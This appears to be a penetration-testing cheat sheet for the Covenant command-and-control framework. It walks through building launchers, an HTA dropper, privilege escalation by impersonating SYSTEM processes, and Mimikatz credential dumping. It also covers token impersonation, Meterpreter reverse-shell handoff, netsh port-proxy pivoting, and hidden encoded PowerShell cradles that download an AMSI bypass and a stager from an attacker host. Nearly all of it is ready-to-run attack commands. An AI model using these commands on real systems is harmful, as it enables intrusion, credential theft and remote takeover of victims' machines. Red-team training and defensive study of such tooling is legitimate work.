## Covenant C2 Framework
- https://github.com/cobbr/Covenant

### Installation
- https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

#### Rastamouse version
```
wget -q https://packages.microsoft.com/config/ubuntu/19.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt -y update
sudo apt -y install apt-transport-https
sudo apt -y update
sudo apt -y install dotnet-sdk-3.1 dnsutils
rm packages-microsoft-prod.deb

git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /opt/Covenant

dotnet build
dotnet run
```

### General
#### Start Covenant
```
/opt/Covenant/Covenant > dotnet run
```

#### Create a listener
- https://github.com/cobbr/Covenant/wiki/Listeners
- Give it a name and ConnectAdress the adress to Connect to

#### Create a launcher (For example PowerShell)
- Select a listener
- Click on Host and create a different url, for example ```\HTTPStager.ps1``` and click on Host!
- Copy the Launcher and Encoded Launcher codes
- If making an executable try both DotNetversions!

#### HTA script
- Use the command in the following HTA file
```
<script language="VBScript">
Function DoStuff()
Dim wsh
Set wsh = CreateObject("Wscript.Shell") 
wsh.run "[YOUR ENCODED LAUNCHER]" 
Set wsh = Nothing
End Function 
DoStuff
self.close 
</script>
```

#### Go back to listener and upload the HTA file

### Run executables on target
- Interact with the grunt.
- Go to tasks, select Assembly, select executable and run!
- Which works: Watson, Sharphound,
- 
### Escalate to system
- Run the task processlist and look for a process running as ```NT AUTHORITY\SYSTEM```
- Then run ImpersonateProcess ```ImpersonateProcess /processid:"<PROCESS ID>"```
- Then run the Launcher again to spawn another grunt. ```Powershell iex (New-Object Net.WebClient).DownloadString('http://175.12.80.10/Stgr.ps1')```
- Go back to the current context using task ```RevertToSelf```

### Dumping credentials
- From System or High integrity
#### Logon passwords
```
Mimikatz sekurlsa::logonpasswords
```

#### Cached credentials
```
LsaCache
```

#### SAM
```
Mimikatz lsadump::sam
```

#### SafetyKatz
```
SafetyKatz
```

### Impersonate
- For example when there is no RDP open and want to run on other credentials
- Open the grunt, Go to task and select "MakeToken"
- Enter the credentials and type Logontype ```LOGON32_LOGON_INTERACTIVE```

```
MakeToken /username:"<USER>" /domain:"<DOMAIN>" /password:"<PASSWORD>" /logontype:"LOGON32_LOGON_INTERACTIVE"
```

### Import scripts
- Interact with the grunt.
- Go to tasks, select PowerShellImport and select the powershell script

### Runas command
```
ShellRunAs /shellcommand:"whoami" /username:"<USERNAME>" /domain:"<DOMAIN>" /password:"<PASSWORD>"
```

### Session passing
#### Covenant --> Meterpreter
```
use exploit/multi/handler
setg payload windows/x64/meterpreter/reverse_https
setg lhost <IP>
setg lport <PORT>
setg exitfunc thread
setg exitonsession false
run -j

# Generate payload
use payload windows/x64/meterpreter/reverse_https
generate -f raw -o /tmp/sc.bin
```
- Go to covenant, select grun --> task --> Shellcode and choose the file

### Covenant pivoting Example
- If need to pivot over a HOP but got a restricted amount of allowed ports. Example following setup:
  - Hop ip = 10.10.121.108 and got comprimised
  - Allowed ports 443, 8080 and 80.
  - Normal covenant running on port 80, 443 is used for chisel, 8080 for webserver.
  - Attacker IP = 10.10.15.16

### Steps
- Setup a new listener in Covenant, on port 8090 Set the 10.10.121.108 as ConnectAddresses and CONNECTPort to 8090.
- Create a PowerShell payload with the new listener and download the file, host this file on the webserver on 8080.
- Configure firewall rules

```
powershell netsh interface portproxy add v4tov4 listenaddress=10.10.121.108 listenport=8080 connectaddress=10.10.15.16 connectport=8080 protocol=tcp
powershell netsh interface portproxy add v4tov4 listenaddress=10.10.121.108 listenport=8090 connectaddress=10.10.15.16 connectport=80 protocol=tcp

# Optional if restricted access to the ports even!
powershell netsh advfirewall firewall add rule name="Allow from 10.10.122.15" dir=in action=allow protocol=ANY remoteip=10.10.122.15
```

- Execute shell example:
```
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.121.108:8080/amsi.txt")); IEX ((new-object net.webclient).downloadstring("http://10.10.121.108:8080/OttoHTTP.ps1"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip

powershell.exe -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMAA4ADoAOAAwADgAMAAvAGEAbQBzAGkALgB0AHgAdAAiACkAKQA7ACAASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMQAuADEAMAA4ADoAOAAwADgAMAAvAE8AdAB0AG8ASABUAFQAUAAuAHAAcwAxACIAKQApAA==
```
